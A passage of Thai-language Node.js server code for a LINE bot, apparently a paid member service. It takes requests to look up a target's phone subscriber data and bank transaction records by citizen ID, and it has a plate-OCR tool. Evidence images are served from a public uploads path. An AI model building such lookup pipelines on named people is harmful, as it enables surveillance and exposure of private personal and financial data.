    db.siBlocked?.[phone] !== true;


  return res.json({

    ok: true,

    member: {

      userId:
        lineUser.userId,

      displayName:
        lineUser.displayName ||
        member.lineName ||
        '-',

      pictureUrl:
        lineUser.pictureUrl ||
        member.pictureUrl ||
        '',

      fullname:
        member.fullname ||
        member.fullName ||
        '-',

      phone:
        phone || '-',

      status:
        member.status ||
        '-',

      expireAt,

      remainingDays,

      permissions: {
        si: siAllowed,
        atm: true,
        store: true,
        welfare: true
      }

    }

  });
});

// ==========================================
// MEMBER TOOL : PLATE OCR
// รับรูปจาก LIFF / WEB
// ==========================================

app.post(
  '/member/tools/plate-ocr',
  (req, res) => {

    toolUpload.single('image')(
      req,
      res,
      async uploadErr => {

        // =========================
        // ลบไฟล์ชั่วคราว
        // =========================
        const deleteTempImage = () => {

          if (
            req.file?.path &&
            fs.existsSync(req.file.path)
          ) {

            try {
              fs.unlinkSync(req.file.path);
            } catch (err) {
              console.error(
                'DELETE PLATE TEMP ERROR:',
                err.message
              );
            }

          }

        };


        try {

          // =========================
          // Upload Error
          // =========================
          if (uploadErr) {

            return res.status(400).json({
              ok: false,
              message:
                uploadErr.message ||
                'อัปโหลดรูปไม่สำเร็จ'
            });

          }


          // =========================
          // ตรวจ LINE Login
          // =========================
          const lineUser =
            req.session?.lineUser;


          if (!lineUser?.userId) {

            deleteTempImage();

            return res.status(401).json({
              ok: false,
              message:
                'กรุณาเข้าสู่ระบบ LINE ก่อน',
              loginUrl:
                '/line/login?next=%2Fmember%2Ftools%2Fimage'
            });

          }


          // =========================
          // ตรวจสมาชิก
          // =========================
          const db =
            loadDB();

          db.members =
            db.members || {};

          const member =
            db.members[lineUser.userId];


          if (!member) {

            deleteTempImage();

            return res.status(403).json({
              ok: false,
              message:
                'ไม่พบข้อมูลสมาชิก'
            });

          }


          if (!isActiveMember(member)) {

            deleteTempImage();

            return res.status(403).json({
              ok: false,
              message:
                'สมาชิกยังไม่ได้รับอนุมัติ หรือหมดอายุแล้ว'
            });

          }


          // =========================
          // ตรวจไฟล์
          // =========================
          if (!req.file) {

            return res.status(400).json({
              ok: false,
              message:
                'กรุณาเลือกรูปป้ายทะเบียน'
            });

          }


          const imagePath =
            req.file.path;


          // =========================
          // อ่านป้ายทะเบียน
          // ใช้ฟังก์ชันเดิมของ BOT
          // =========================
          const result =
  await readPlateOcr(
    imagePath,
    req.file.originalname,
    req.file.mimetype
  );


          const resultText =
            formatPlateOcr(
              result
            );


          // ลบรูปหลังอ่านเสร็จ
          deleteTempImage();


          return res.json({
            ok: true,
            result: resultText
          });


        } catch (err) {

          deleteTempImage();

          console.error(
            'WEB PLATE OCR ERROR:',
            err?.response?.data ||
            err.message ||
            err
          );


          return res.status(500).json({
            ok: false,
            message:
              'อ่านป้ายทะเบียนไม่สำเร็จ กรุณาลองใหม่อีกครั้ง'
          });

        }

      }
    );

  }
);

// ==========================================
// MEMBER BASE REQUEST : SUBMIT
// รับข้อมูลจาก LIFF
// ==========================================

app.post(
  '/member/base/request/submit',
  (req, res) => {

    toolUpload.single('evidence')(
      req,
      res,
      async uploadErr => {

        let savedFilePath =
          req.file?.path || '';


        const deleteUploadedFile = () => {

          if (
            savedFilePath &&
            fs.existsSync(savedFilePath)
          ) {

            try {
              fs.unlinkSync(
                savedFilePath
              );
            } catch (err) {

              console.error(
                'DELETE BASE FILE ERROR:',
                err.message
              );

            }

          }

        };


        try {

          // =========================
          // UPLOAD ERROR
          // =========================

          if (uploadErr) {

            deleteUploadedFile();

            return res.status(400).json({
              ok: false,
              message:
                uploadErr.message ||
                'อัปโหลดหลักฐานไม่สำเร็จ'
            });

          }


          // =========================
          // LINE LOGIN
          // =========================

          const lineUser =
            req.session?.lineUser;


          if (!lineUser?.userId) {

            deleteUploadedFile();

            return res.status(401).json({
              ok: false,

              message:
                'กรุณาเข้าสู่ระบบ LINE ก่อน',

              loginUrl:
                '/line/login?next=%2Fmember%2Fbase%2Frequest'
            });

          }


          // =========================
          // MEMBER
          // =========================

          const db =
            loadDB();

          db.members =
            db.members || {};


          const member =
            db.members[
              lineUser.userId
            ];


          if (
            !member ||
            (
              !isActiveMember(member) &&
              !isAdmin(lineUser.userId)
            )
          ) {

            deleteUploadedFile();

            return res.status(403).json({
              ok: false,

              message:
                'บัญชีสมาชิกนี้ไม่มีสิทธิ์ส่งคำขอ BASE'
            });

          }


          // =========================
          // รับค่าจาก FORM
          // =========================

          const phone =
            String(
              req.body?.phone || ''
            )
              .replace(/\D/g, '');


          const network =
            String(
              req.body?.network || ''
            )
              .trim()
              .toUpperCase();


          const caseName =
            String(
              req.body?.caseName || ''
            )
              .trim();


          const targetName =
            String(
              req.body?.targetName || ''
            )
              .trim();


          const citizenId =
            String(
              req.body?.citizenId || ''
            )
              .replace(/\D/g, '');


          // =========================
          // ตรวจหมายเลขโทรศัพท์
          // =========================

          if (
            !/^0\d{9}$/.test(phone)
          ) {

            deleteUploadedFile();

            return res.status(400).json({
              ok: false,

              message:
                'กรุณาระบุหมายเลขเป้าหมายให้ครบ 10 หลัก'
            });

          }


          // =========================
          // ตรวจเครือข่าย
          // =========================

          if (
            ![
              'AIS',
              'TRUE',
              'DTAC'
            ].includes(network)
          ) {

            deleteUploadedFile();

            return res.status(400).json({
              ok: false,

              message:
                'กรุณาเลือกเครือข่าย AIS, TRUE หรือ DTAC'
            });

          }


          // =========================
          // ตรวจชื่อเคส
          // =========================

          if (
            caseName.length < 2 ||
            caseName.length > 500
          ) {

            deleteUploadedFile();

            return res.status(400).json({
              ok: false,

              message:
                'กรุณาระบุชื่อเคสหรือเหตุในการขอข้อมูล'
            });

          }


          // =========================
          // ตรวจชื่อเป้าหมาย
          // =========================

          if (
            targetName.length < 2 ||
            targetName.length > 200
          ) {

            deleteUploadedFile();

            return res.status(400).json({
              ok: false,

              message:
                'กรุณาระบุชื่อ-นามสกุลเป้าหมาย'
            });

          }


          // =========================
          // ตรวจเลขบัตร
          // =========================

          if (
            !/^\d{13}$/.test(
              citizenId
            )
          ) {

            deleteUploadedFile();

            return res.status(400).json({
              ok: false,

              message:
                'กรุณาระบุเลขบัตรประชาชนเป้าหมาย 13 หลัก'
            });

          }


          // =========================
          // ตรวจหลักฐาน
          // =========================

          if (!req.file) {

            return res.status(400).json({
              ok: false,

              message:
                'กรุณาอัปโหลดภาพหลักฐานประกอบคำขอ'
            });

          }


          // =========================
          // ตั้งชื่อไฟล์หลักฐานใหม่
          // =========================

          const extMap = {
            'image/jpeg': 'jpg',
            'image/png': 'png',
            'image/webp': 'webp'
          };


          const ext =
            extMap[
              req.file.mimetype
            ] || 'jpg';


          const fileName =
            `base_${lineUser.userId}_${Date.now()}.${ext}`;


          const finalPath =
            path.join(
              UPLOAD_DIR,
              fileName
            );


          fs.renameSync(
            req.file.path,
            finalPath
          );


          savedFilePath =
            finalPath;


          // =========================
          // ข้อมูลผู้ขอ
          // =========================

          const registeredName =
            [
              member?.rank,
              member?.fullname
            ]
              .filter(Boolean)
              .join(' ')
              .trim() ||

            member?.lineName ||

            lineUser.displayName ||

            '-';


          // =========================
          // REQUEST ID
          // =========================

          const requestId =
            'BASE-' +
            Date.now()
              .toString(36)
              .toUpperCase();


          // =========================
          // ข้อความ ADMIN
          // =========================

          const adminText =
`🚨 รายการ BASE ใหม่

เลขคำขอ: ${requestId}

📱 หมายเลขเป้าหมาย: ${phone}
📡 เครือข่าย: ${network}

📁 ชื่อเคส/เหตุในการขอข้อมูล:
${caseName}

👤 ชื่อ-นามสกุลเป้าหมาย:
${targetName}

🪪 เลขบัตรเป้าหมาย:
${citizenId}

━━━━━━━━━━━━━━
👮 ข้อมูลผู้ขอ

ชื่อ LINE:
${lineUser.displayName || member?.lineName || '-'}

ชื่อที่สมัคร:
${registeredName}

เบอร์ที่สมัคร:
${member?.phone || '-'}

ตำแหน่ง:
${member?.position || '-'}

สังกัด:
${member?.department || '-'}

UID:
${lineUser.userId}

เวลาส่ง:
${nowThai()}

ตอบกลับสมาชิก:
send#${lineUser.userId}#ข้อความที่ต้องการส่ง`;


          // =========================
          // URL รูปหลักฐาน
          // =========================

          const baseUrl =
            BASE_URL ||
            'https://memegabot.com';


          const evidenceUrl =
            `${baseUrl}/uploads/${fileName}`;


          // =========================
          // แจ้ง ADMIN
          // =========================

          await notifyAdmins([
            {
              type: 'text',

              text:
                limitLineMessage(
                  adminText
                )
            },

            {
              type: 'image',

              originalContentUrl:
                evidenceUrl,

              previewImageUrl:
                evidenceUrl
            }
          ]);


          // =========================
          // สำเร็จ
          // =========================

          return res.json({
            ok: true,

            requestId,

            message:
              'รับข้อมูลคำขอ BASE เรียบร้อยแล้ว ระบบได้ส่งข้อมูลให้แอดมินตรวจสอบแล้ว'
          });


        } catch (err) {

          deleteUploadedFile();


          console.error(
            'BASE LIFF REQUEST ERROR:',
            err?.response?.data ||
            err.message ||
            err
          );


          return res.status(500).json({
            ok: false,

            message:
              'ส่งคำขอ BASE ไม่สำเร็จ กรุณาลองใหม่อีกครั้ง'
          });

        }

      }
    );

  }
);

// ==========================================
// MEMBER BANK REQUEST : SUBMIT
// ==========================================

app.post(
  '/member/bank/request/submit',
  (req, res) => {

    toolUpload.single('evidence')(
      req,
      res,
      async uploadErr => {

        let savedFilePath =
          req.file?.path || '';


        const deleteUploadedFile = () => {

          if (
            savedFilePath &&
            fs.existsSync(savedFilePath)
          ) {

            try {
              fs.unlinkSync(
                savedFilePath
              );
            } catch (err) {

              console.error(
                'DELETE BANK FILE ERROR:',
                err.message
              );

            }

          }

        };


        try {

          if (uploadErr) {

            deleteUploadedFile();

            return res.status(400).json({
              ok: false,
              message:
                uploadErr.message ||
                'อัปโหลดหลักฐานไม่สำเร็จ'
            });

          }


          // =========================
          // LINE LOGIN
          // =========================

          const lineUser =
            req.session?.lineUser;


          if (!lineUser?.userId) {

            deleteUploadedFile();

            return res.status(401).json({
              ok: false,

              message:
                'กรุณาเข้าสู่ระบบ LINE ก่อน',

              loginUrl:
                '/line/login?next=%2Fmember%2Fbank%2Frequest'
            });

          }


          // =========================
          // ตรวจสมาชิก
          // =========================

          const db =
            loadDB();

          db.members =
            db.members || {};


          const member =
            db.members[
              lineUser.userId
            ];


          if (
            !member ||
            (
              !isActiveMember(member) &&
              !isAdmin(lineUser.userId)
            )
          ) {

            deleteUploadedFile();

            return res.status(403).json({
              ok: false,

              message:
                'บัญชีนี้ไม่มีสิทธิ์ส่งคำขอข้อมูลธนาคาร'
            });

          }


          // =========================
          // รับค่าจาก FORM
          // =========================

          const accountNumber =
            String(
              req.body?.accountNumber || ''
            )
              .replace(/\D/g, '');


          const citizenId =
            String(
              req.body?.citizenId || ''
            )
              .replace(/\D/g, '');


          const bankName =
            String(
              req.body?.bankName || ''
            )
              .trim();


          const requestPeriod =
            String(
              req.body?.requestPeriod || ''
            )
              .trim();


          const caseName =
            String(
              req.body?.caseName || ''
            )
              .trim();


          // =========================
          // ต้องมีเลขบัญชี
          // หรือเลขบัตรอย่างน้อย 1 อย่าง
          // =========================

          if (
            !accountNumber &&
            !citizenId
          ) {

            deleteUploadedFile();

            return res.status(400).json({
              ok: false,

              message:
                'กรุณาระบุเลขบัญชี หรือเลขบัตรประชาชน 13 หลัก'
            });

          }


          // ถ้ามีเลขบัตร ต้องครบ 13 หลัก
          if (
            citizenId &&
            !/^\d{13}$/.test(citizenId)
          ) {

            deleteUploadedFile();

            return res.status(400).json({
              ok: false,

              message:
                'เลขบัตรประชาชนต้องมี 13 หลัก'
            });

          }


          if (!bankName) {

            deleteUploadedFile();

            return res.status(400).json({
              ok: false,

              message:
                'กรุณาระบุชื่อธนาคาร'
            });

          }


          if (!requestPeriod) {

            deleteUploadedFile();

            return res.status(400).json({
              ok: false,

              message:
                'กรุณาระบุวันที่และเวลาที่ต้องการข้อมูลเดินบัญชี'
            });

          }


          if (
            caseName.length < 2 ||
            caseName.length > 500
          ) {

            deleteUploadedFile();

            return res.status(400).json({
              ok: false,

              message:
                'กรุณาระบุชื่อเคสหรือเหตุในการขอข้อมูล'
            });

          }


          if (!req.file) {

            return res.status(400).json({
              ok: false,

              message:
                'กรุณาแนบภาพหลักฐานประกอบคำขอ'
            });

          }


          // =========================
          // ตั้งชื่อไฟล์แบบสุ่ม
          // =========================

          const extMap = {
            'image/jpeg': 'jpg',
            'image/png': 'png',
            'image/webp': 'webp'
          };


          const ext =
            extMap[
              req.file.mimetype
            ] || 'jpg';


          const randomId =
            crypto
              .randomBytes(16)
              .toString('hex');


          const fileName =
            `bank_${randomId}.${ext}`;


          const finalPath =
            path.join(
              UPLOAD_DIR,
              fileName
            );


          fs.renameSync(
            req.file.path,
            finalPath
          );


          savedFilePath =
            finalPath;


          // =========================
          // ข้อมูลสมาชิก
          // =========================

          const registeredName =
            [
              member?.rank,
              member?.fullname
            ]
              .filter(Boolean)
              .join(' ')
              .trim() ||

            member?.lineName ||

            lineUser.displayName ||

            '-';


          const requestId =
            'BANK-' +
            Date.now()
              .toString(36)
              .toUpperCase();


          // =========================
          // ข้อความ ADMIN
          // =========================

          const adminText =
`🏦 รายการขอข้อมูลธนาคารใหม่

เลขคำขอ: ${requestId}

เลขบัญชี:
${accountNumber || '-'}

เลขบัตรประชาชน:
${citizenId || '-'}

ธนาคาร:
${bankName}

ช่วงวันที่ / เวลาที่ขอข้อมูล:
${requestPeriod}

📁 ชื่อเคส / เหตุในการขอ:
${caseName}

━━━━━━━━━━━━━━
👮 ข้อมูลผู้ขอ

ชื่อ LINE:
${lineUser.displayName || member?.lineName || '-'}

ชื่อที่สมัคร:
${registeredName}

เบอร์ที่สมัคร:
${member?.phone || '-'}

ตำแหน่ง:
${member?.position || '-'}

สังกัด:
${member?.department || '-'}

UID:
${lineUser.userId}

เวลาส่ง:
${nowThai()}

ตอบกลับสมาชิก:
send#${lineUser.userId}#ข้อความที่ต้องการส่ง`;


          const baseUrl =
            BASE_URL ||
            'https://memegabot.com';


          const evidenceUrl =
            `${baseUrl}/uploads/${fileName}`;


          // =========================
          // แจ้ง ADMIN
          // =========================

          await notifyAdmins([
            {
              type: 'text',

              text:
                limitLineMessage(
                  adminText
                )
            },

            {
              type: 'image',

              originalContentUrl:
                evidenceUrl,

              previewImageUrl:
                evidenceUrl
            }
          ]);


          return res.json({
            ok: true,

            requestId,

            message:
              'รับคำขอข้อมูลธนาคารเรียบร้อยแล้ว ระบบได้ส่งให้แอดมินตรวจสอบแล้ว'
          });


        } catch (err) {

          deleteUploadedFile();


          console.error(
            'BANK LIFF REQUEST ERROR:',
            err?.response?.data ||
            err.message ||
            err
          );


          return res.status(500).json({
            ok: false,

            message:
              'ส่งคำขอข้อมูลธนาคารไม่สำเร็จ กรุณาลองใหม่อีกครั้ง'
          });

        }

      }
    );

  }
);

// ==========================================
// MEMBER BANK REQUEST : PAGE
// ==========================================

app.get(
  '/member/bank/request',
  (req, res) => {

    const lineUser =
      req.session?.lineUser;


    // =========================
    // ยังไม่ได้ Login LINE
    // =========================
    if (!lineUser?.userId) {

      return res.redirect(
        '/line/login?next=%2Fmember%2Fbank%2Frequest'
      );

    }


    // =========================
    // ตรวจสมาชิก
    // =========================
    const db =
      loadDB();

    db.members =
      db.members || {};


    const member =
      db.members[
        lineUser.userId
      ];


    if (
      !member ||
      (
        !isActiveMember(member) &&
        !isAdmin(lineUser.userId)
      )
    ) {

      return res
        .status(403)
        .send(
          'บัญชีนี้ไม่มีสิทธิ์ส่งคำขอข้อมูลธนาคาร'
        );

    }


    // ข้อมูลสมาชิกผู้ส่งคำขอจากบัญชีที่ Login อยู่
    const escapeHtml = (value = '') =>
      String(value)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');

    const memberUid = escapeHtml(lineUser.userId);

    const memberFullName = escapeHtml(
      member.fullname || member.fullName || '-'
    );

    const memberPhone = escapeHtml(
      member.phone || member.tel || member.mobile || '-'
    );

    const rawPictureUrl = String(
      lineUser.pictureUrl || member.pictureUrl || ''
    ).trim();

    const memberPictureUrl = /^https?:\/\//i.test(rawPictureUrl)
      ? escapeHtml(rawPictureUrl)
      : '';


    // =========================
    // หน้าเว็บ
    // =========================
    res.send(`
<!DOCTYPE html>

<html lang="th">

<head>

<meta charset="UTF-8">

<meta
  name="viewport"
  content="width=device-width, initial-scale=1.0, maximum-scale=1.0"
>

<title>NECT BANK REQUEST</title>


<style>

* {
  box-sizing: border-box;
}


body {
  margin: 0;

  min-height: 100vh;

  font-family:
    Arial,
    sans-serif;

  color: #e5e7eb;

  background:
    radial-gradient(
      circle at top,
      #1e3a5f 0%,
      #0b1220 36%,
      #050810 100%
    );
}


.page {
  width: 100%;

  max-width: 560px;

  margin: 0 auto;

  padding:
    28px 16px 55px;
}


/* =========================
   BRAND
========================= */

.brand {
  text-align: center;

  margin-bottom: 24px;
}


.brand-icon {
  width: 64px;
  height: 64px;

  margin:
    0 auto 13px;

  display: flex;

  align-items: center;
  justify-content: center;

  border-radius: 20px;

  font-size: 30px;

  background:
    linear-gradient(
      145deg,
      #047857,
      #059669
    );

  box-shadow:
    0 15px 36px
    rgba(5, 150, 105, .30);
}


.brand-title {
  font-size: 21px;

  font-weight: 800;

  color: #ffffff;
}


.brand-subtitle {
  margin-top: 6px;

  font-size: 11px;

  letter-spacing: 1.4px;

  color: #94a3b8;
}


/* =========================
   CARD
========================= */

.card {
  overflow: hidden;

  border-radius: 24px;

  background:
    rgba(15, 23, 42, .95);

  border:
    1px solid
    rgba(148, 163, 184, .14);

  box-shadow:
    0 26px 70px
    rgba(0, 0, 0, .38);
}


.card-header {
  padding: 21px;

  border-bottom:
    1px solid
    rgba(148, 163, 184, .11);
}


.card-title {
  font-size: 17px;

  font-weight: 800;

  color: #f8fafc;
}


.card-desc {
  margin-top: 7px;

  font-size: 12px;

  line-height: 1.7;

  color: #94a3b8;
}


.card-body {
  padding: 20px;
}


/* =========================
   MEMBER PROFILE
========================= */

.member-profile {
  margin-bottom: 20px;
  padding: 18px;
  border: 1px solid rgba(16, 185, 129, .20);
  border-radius: 18px;
  background: rgba(16, 185, 129, .06);
}

.member-profile-header {
  display: flex;
  align-items: center;
  gap: 14px;
  margin-bottom: 16px;
}

.member-avatar {
  position: relative;
  display: flex;
  align-items: center;
  justify-content: center;
  flex: 0 0 72px;
  width: 72px;
  height: 72px;
  overflow: hidden;
  border: 2px solid rgba(16, 185, 129, .35);
  border-radius: 50%;
  background: #12352f;
  font-size: 32px;
}

.member-avatar img {
  position: absolute;
  inset: 0;
  display: block;
  width: 100%;
  height: 100%;
  object-fit: cover;
}

.member-profile-title {
  margin: 0;
  color: #d1fae5;
  font-size: 16px;
}

.member-profile-desc {
  margin: 6px 0 0;
  color: #94a3b8;
  font-size: 11px;
  line-height: 1.6;
}

.member-details {
  display: grid;
  gap: 12px;
  margin: 0;
}

.member-details dt {
  margin-bottom: 4px;
  color: #94a3b8;
  font-size: 11px;
}

.member-details dd {
  margin: 0;
  color: #f8fafc;
  font-size: 14px;
  line-height: 1.6;
  overflow-wrap: anywhere;
}

.member-uid {
  font-family: monospace;
  user-select: all;
}


/* =========================
   FORM
========================= */

.field {
  margin-bottom: 18px;
}


.field-label {
  display: block;

  margin-bottom: 8px;

  font-size: 12px;

  font-weight: 700;

  color: #cbd5e1;
}


.required {
  color: #f87171;
}


.optional {
  color: #64748b;

  font-size: 10px;

  font-weight: 400;
}


input,
select,
textarea {
  width: 100%;

  border:
    1px solid
    rgba(148, 163, 184, .18);

  outline: none;

  border-radius: 14px;

  padding:
    13px 14px;

  font-size: 14px;

  color: #f8fafc;

  background:
    rgba(2, 6, 23, .55);

  transition:
    border-color .2s ease,
    box-shadow .2s ease;
}


input:focus,
select:focus,
textarea:focus {
  border-color:
    rgba(16, 185, 129, .70);

  box-shadow:
    0 0 0 3px
    rgba(16, 185, 129, .11);
}


input::placeholder,
textarea::placeholder {
  color: #64748b;
}


select option {
  color: #111827;

  background: #ffffff;
}


textarea {
  min-height: 105px;

  resize: vertical;

  line-height: 1.6;
}


.helper {
  margin-top: 7px;

  font-size: 10px;

  line-height: 1.6;

  color: #64748b;
}


/* =========================
   NOTICE
========================= */

.notice {
  margin-bottom: 18px;

  padding: 13px 14px;

  border-radius: 14px;

  font-size: 11px;

  line-height: 1.7;

  color: #fde68a;

  background:
    rgba(245, 158, 11, .06);

  border:
    1px solid
    rgba(245, 158, 11, .16);
}


/* =========================
   UPLOAD
========================= */

.upload-box {
  position: relative;

  min-height: 190px;

  display: flex;

  align-items: center;
  justify-content: center;

  overflow: hidden;

  text-align: center;

  border-radius: 17px;

  border:
    1.5px dashed
    rgba(52, 211, 153, .38);

  background:
    rgba(30, 41, 59, .48);

  cursor: pointer;
}


.upload-box:active {
  transform:
    scale(.995);
}


.upload-placeholder {
  padding: 25px;
}


.upload-icon {
  font-size: 38px;
}


.upload-title {
  margin-top: 11px;

  font-size: 14px;

  font-weight: 700;

  color: #e2e8f0;
}


.upload-help {
  margin-top: 7px;

  font-size: 10px;

  line-height: 1.7;

  color: #94a3b8;
}


#evidence {
  display: none;
}


#preview {
  display: none;

  width: 100%;

  max-height: 390px;

  object-fit: contain;

  background: #020617;
}


.change-button {
  display: none;

  width: 100%;

  margin-top: 10px;

  min-height: 43px;

  border-radius: 13px;

  border:
    1px solid
    rgba(148, 163, 184, .18);

  color: #cbd5e1;

  background:
    rgba(255, 255, 255, .035);

  cursor: pointer;
}


/* =========================
   SUBMIT
========================= */

.submit-button {
  width: 100%;

  min-height: 55px;

  margin-top: 8px;

  border: 0;

  border-radius: 15px;

  font-size: 15px;

  font-weight: 800;

  color: #ffffff;

  background:
    linear-gradient(
      135deg,
      #059669,
      #047857
    );

  box-shadow:
    0 13px 30px
    rgba(5, 150, 105, .28);

  cursor: pointer;
}


.submit-button:disabled {
  cursor: not-allowed;

  opacity: .45;

  box-shadow: none;
}


/* =========================
   STATUS
========================= */

.loading {
  display: none;

  margin-top: 16px;

  padding: 15px;

  text-align: center;

  border-radius: 14px;

  font-size: 12px;

  color: #a7f3d0;

  background:
    rgba(16, 185, 129, .07);

  border:
    1px solid
    rgba(16, 185, 129, .15);
}


.error-box {
  display: none;

  margin-top: 16px;

  padding: 15px;

  border-radius: 14px;

  font-size: 12px;

  line-height: 1.7;

  color: #fecaca;

  background:
    rgba(239, 68, 68, .07);

  border:
    1px solid
    rgba(239, 68, 68, .18);
}


.success-box {
  display: none;

  margin-top: 16px;

  padding: 18px;

  border-radius: 16px;

  font-size: 13px;

  line-height: 1.7;

  color: #bbf7d0;

  background:
    rgba(34, 197, 94, .07);

  border:
    1px solid
    rgba(34, 197, 94, .18);
}


.warning {
  margin-top: 18px;

  padding: 14px;

  border-radius: 14px;

  font-size: 10px;

  line-height: 1.7;

  color: #94a3b8;

  background:
    rgba(255, 255, 255, .025);

  border:
    1px solid
    rgba(148, 163, 184, .08);
}


@media (max-width: 480px) {

  .page {
    padding:
      20px 12px 40px;
  }


  .card {
    border-radius: 20px;
  }


  .card-body {
    padding: 16px;
  }

}

</style>

</head>


<body>


<div class="page">


  <div class="brand">

    <div class="brand-icon">
      🏦
    </div>

    <div class="brand-title">
      NECT BANK REQUEST
    </div>

    <div class="brand-subtitle">
      BANK INFORMATION REQUEST SYSTEM
    </div>

  </div>


  <div class="card">


    <div class="card-header">

      <div class="card-title">
        แบบฟอร์มขอข้อมูลธนาคาร
      </div>

      <div class="card-desc">
        กรุณากรอกข้อมูลและช่วงเวลาที่ต้องการ
        พร้อมแนบหลักฐานประกอบคำขอ
      </div>

    </div>


    <div class="card-body">


      <section class="member-profile" aria-labelledby="bank-member-title">

        <div class="member-profile-header">

          <div class="member-avatar">
            <span aria-hidden="true">👤</span>
            ${memberPictureUrl ? `
              <img
                id="memberProfileImage"
                src="${memberPictureUrl}"
                alt="ภาพโปรไฟล์สมาชิก"
                width="72"
                height="72"
                referrerpolicy="no-referrer"
              >
            ` : ''}
          </div>

          <div>
            <h2 id="bank-member-title" class="member-profile-title">
              ข้อมูลสมาชิกผู้ส่งคำขอ
            </h2>
            <p class="member-profile-desc">
              ข้อมูลของบัญชีที่เข้าสู่ระบบ
            </p>
          </div>

        </div>

        <dl class="member-details">
          <div>
            <dt>UID</dt>
            <dd class="member-uid">${memberUid}</dd>
          </div>
          <div>
            <dt>ชื่อ–นามสกุล</dt>
            <dd>${memberFullName}</dd>
          </div>
          <div>
            <dt>เบอร์โทรศัพท์</dt>
            <dd>${memberPhone}</dd>
          </div>
        </dl>

      </section>


      <div class="notice">
        กรณีมีเลขบัญชี กรุณาระบุเลขบัญชี
        หากไม่มีเลขบัญชี ให้ระบุเลขบัตรประชาชน 13 หลัก
        อย่างน้อยหนึ่งรายการ
      </div>


      <form id="bankForm">


        <!-- ACCOUNT NUMBER -->

        <div class="field">

          <label class="field-label">

            หมายเลขบัญชีธนาคาร

            <span class="optional">
              (ถ้ามี)
            </span>

          </label>


          <input
            type="text"
            id="accountNumber"
            name="accountNumber"
            maxlength="30"
            inputmode="numeric"
            placeholder="กรอกหมายเลขบัญชี"
          >


          <div class="helper">
            กรณีไม่มีเลขบัญชี ให้กรอกเลขบัตรประชาชนด้านล่าง
          </div>

        </div>


        <!-- CITIZEN ID -->

        <div class="field">

          <label class="field-label">

            เลขบัตรประชาชน

            <span class="optional">
              (กรณีไม่มีเลขบัญชี)
            </span>

          </label>


          <input
            type="text"
            id="citizenId"
            name="citizenId"
            maxlength="13"
            inputmode="numeric"
            placeholder="เลขบัตรประชาชน 13 หลัก"
          >

        </div>


        <!-- BANK -->

        <div class="field">

          <label class="field-label">

            ชื่อธนาคาร

            <span class="required">
              *
            </span>

          </label>


          <select
            id="bankName"
            name="bankName"
            required
          >

            <option value="">
              -- เลือกธนาคาร --
            </option>

            <option value="ธนาคารกรุงเทพ">
              ธนาคารกรุงเทพ
            </option>

            <option value="ธนาคารกสิกรไทย">
              ธนาคารกสิกรไทย
            </option>

            <option value="ธนาคารกรุงไทย">
              ธนาคารกรุงไทย
            </option>

            <option value="ธนาคารไทยพาณิชย์">
              ธนาคารไทยพาณิชย์
            </option>

            <option value="ธนาคารกรุงศรีอยุธยา">
              ธนาคารกรุงศรีอยุธยา
            </option>

            <option value="ธนาคารทหารไทยธนชาต">
              ธนาคารทหารไทยธนชาต
            </option>

            <option value="ธนาคารออมสิน">
              ธนาคารออมสิน
            </option>

            <option value="ธนาคารเพื่อการเกษตรและสหกรณ์การเกษตร">
              ธ.ก.ส.
            </option>

            <option value="ธนาคารอาคารสงเคราะห์">
              ธนาคารอาคารสงเคราะห์
            </option>

            <option value="ธนาคารอื่น">
              ธนาคารอื่น
            </option>

          </select>

        </div>


        <!-- REQUEST PERIOD -->

        <div class="field">

          <label class="field-label">

            วันที่ - เวลาที่ต้องการข้อมูลเดินบัญชี

            <span class="required">
              *
            </span>

          </label>


          <textarea
            id="requestPeriod"
            name="requestPeriod"
            maxlength="500"
            placeholder="ระบุช่วงวันที่และเวลา เช่น วันที่เริ่มต้น ถึง วันที่สิ้นสุด พร้อมช่วงเวลาที่ต้องการ"
            required
          ></textarea>


          <div class="helper">
            กรุณาระบุช่วงวันที่และเวลาให้ชัดเจน
          </div>

        </div>


        <!-- CASE -->

        <div class="field">

          <label class="field-label">

            ชื่อเคสคดี / เหตุในการขอข้อมูล

            <span class="required">
              *
            </span>

          </label>


          <textarea
            id="caseName"
            name="caseName"
            maxlength="500"
            placeholder="กรอกชื่อเคสคดี และเหตุในการขอข้อมูล"
            required
          ></textarea>

        </div>


        <!-- EVIDENCE -->

        <div class="field">

          <label class="field-label">

            เอกสาร / หลักฐานคดี

            <span class="required">
              *
            </span>

          </label>


          <label
            class="upload-box"
            for="evidence"
          >


            <div
              class="upload-placeholder"
              id="uploadPlaceholder"
            >

              <div class="upload-icon">
                📎
              </div>


              <div class="upload-title">
                แตะเพื่ออัปโหลดหลักฐาน
              </div>


              <div class="upload-help">

                เช่น เอกสารคดี /
                ปจว. /
                หมายจับ /
                เอกสารประกอบคำขอ

                <br>

                รองรับ JPG, PNG และ WEBP

              </div>

            </div>


            <img
              id="preview"
              alt="Evidence preview"
            >


          </label>


          <input
            type="file"
            id="evidence"
            name="evidence"
            accept="image/jpeg,image/png,image/webp"
            required
          >


          <button
            type="button"
            id="changeImage"
            class="change-button"
          >
            เลือกภาพใหม่
          </button>

        </div>


        <!-- SUBMIT -->

        <button
          type="submit"
          class="submit-button"
          id="submitButton"
        >
          🏦 ส่งคำขอข้อมูล
        </button>


      </form>


      <div
        class="loading"
        id="loading"
      >
        ⏳ กำลังส่งคำขอให้แอดมิน
        กรุณารอสักครู่...
      </div>


      <div
        class="error-box"
        id="errorBox"
      ></div>


      <div
        class="success-box"
        id="successBox"
      ></div>


      <div class="warning">

        🔐 กรุณาตรวจสอบข้อมูลและหลักฐาน
        ให้ถูกต้องก่อนกดส่งคำขอ

      </div>


    </div>

  </div>

</div>


<script>


// หากภาพโปรไฟล์โหลดไม่ได้ ให้แสดงไอคอนสมาชิกแทน
const memberProfileImage =
  document.getElementById('memberProfileImage');

if (memberProfileImage) {
  const showMemberAvatarFallback = () => {
    memberProfileImage.style.display = 'none';
  };

  memberProfileImage.addEventListener('error', showMemberAvatarFallback);

  if (memberProfileImage.complete && !memberProfileImage.naturalWidth) {
    showMemberAvatarFallback();
  }
}


const bankForm =
  document.getElementById(
    'bankForm'
  );


const accountNumber =
  document.getElementById(
    'accountNumber'
  );


const citizenId =
  document.getElementById(
    'citizenId'
  );


const evidence =
  document.getElementById(
    'evidence'
  );


const preview =
  document.getElementById(
    'preview'
  );


const uploadPlaceholder =
  document.getElementById(
    'uploadPlaceholder'
  );


const changeImage =
  document.getElementById(
    'changeImage'
  );


